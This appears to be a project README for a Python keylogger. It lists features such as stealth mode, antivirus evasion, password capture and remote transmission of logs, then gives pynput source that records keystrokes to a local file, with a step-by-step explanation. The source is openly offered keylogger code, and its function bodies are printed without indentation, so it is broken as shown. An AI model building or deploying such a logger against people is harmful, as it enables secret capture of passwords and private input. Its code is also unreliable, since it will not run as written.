# Basic Keylogger
A keylogger (short for keystroke logger) is a type of software or hardware device designed to secretly monitor and record each keystroke made on a computer or device. Keyloggers are often used for both legitimate and malicious purposes.

# Legitimate Uses:

* Employers tracking employee activity
* Parents monitoring children's online behavior.
* Troubleshooting and system usage analysis.

# Malicious Uses:
Cybercriminals steal sensitive information like passwords, credit card numbers, and personal data.

# Features
* Keystroke Logging
The primary function: captures and records every key pressed on the keyboard.
* Stealth Mode
Operates undetected by the user and often avoids detection by antivirus or system monitoring tools.
* Clipboard Monitoring
Tracks anything copied or pasted, such as text, passwords, or sensitive data.
* Application-Specific Logging
It focuses on capturing input from specific applications, like word processors or web browsers.
* Remote Access and Data Transmission
Sends recorded data to a remote server, email, or cloud storage for external monitoring.
* Screenshot Capture
Periodically takes screenshots of the screen to track visual activity alongside keystrokes.
* Website Tracking
Monitors websites visited and forms filled out.
* Password Logging
Captures passwords entered in login fields or forms.
* Search Query Monitoring
Records search terms entered into search engines.
* Time and Activity Logs
Tracks the date, time, and duration of user activity to give a timeline of usage.

# Code
     from pynput import keyboard

    log_file = "keylog.txt"

    def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f" {key} ")  # Handle special keys

    def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener on Esc key

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Code explanation
   # 1. Importing Required Module 
    from pynput import keyboard
   * Purpose: This imports the keyboard module from the pynput library.
   * Functionality: The pynput. keyboard module allows the program to monitor and control keyboard events, such as key presses and releases

  # 2. Defining the Log File
    log_file = "keylog.txt"
 * Purpose: Specify the file name (keylog.txt) where all recorded keystrokes will be stored.
 * Details: Every keypress is written into this file in append to preserve previously recorded data.

# 3. Handling Key Press Events
    def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f" {key} ")  # Handle special keys
  * Defines a function on_press that is triggered every time a key is pressed.
  * Opens the file keylog.txt in append mode ("a") to add new data without overwriting existing data.
  * Logs the pressed key's character representation (key.char).
  * Captures an AttributeError for special keys (e.g., Shift, Enter, Ctrl).
  * All keystrokes are logged into keylog.txt, including regular characters and special keys.
    
# 4. Handling Key Release Events
    def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener on Esc key
  * Defines a function on_release that is triggered when a key is released.
  * Checks if the released key is the Escape (Esc) key.
  * If Esc is pressed, the function returns False, which stops the keylogger listener.
  * This provides a way to exit the program gracefully.
    
# 5. Starting the Keylogger Listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
  * Initializes and starts the keyboard. Listener to track keyboard events.
  * on_press: Specifies the function to handle key press events
  * on_release: Specifies the function to handle key release events.
  * The with statement ensures the listener runs until stopped.
  * listener.join() keeps the program running and actively listens to keyboard input.



      
   
     
